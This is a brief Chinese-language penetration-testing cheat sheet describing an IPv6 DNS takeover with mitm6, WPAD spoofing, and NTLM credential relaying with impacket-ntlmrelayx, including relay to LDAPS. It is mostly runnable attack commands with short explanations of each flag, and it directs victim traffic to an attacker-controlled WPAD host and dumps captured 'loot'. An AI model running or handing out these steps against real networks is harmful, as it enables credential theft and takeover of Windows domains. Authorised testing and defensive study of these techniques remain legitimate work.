	自MS16-077起，不再通过广播协议请求 WPAD 文件的位置，而仅通过 DNS 请求。
	crackmapexec smb $hosts --gen-relay-list relay.txt

	DNS 通过 IPv6 接管，mitm6 将通过 DHCPv6 请求 IPv6 地址
	-d 是我们过滤请求的域名 - 被攻击的域
	-i 是我们让 mitm6 监听事件的接口
	>mitm6 -i eth0 -d $domain
	欺骗 WPAD 和中继 NTLM 凭据
	>impacket-ntlmrelayx -6 -wh $attacker_ip -of loot -tf relay.txt
	>impacket-ntlmrelayx -6 -wh $attacker_ip -l /tmp -socks -debug

	-ip 是您希望中继运行的接口
	-wh 用于 WPAD 主机，指定wpad 文件
	-t 是您要中继到的目标。
	>impacket-ntlmrelayx -ip 10.10.10.1 -wh $attacker_ip -t ldaps://10.10.10.2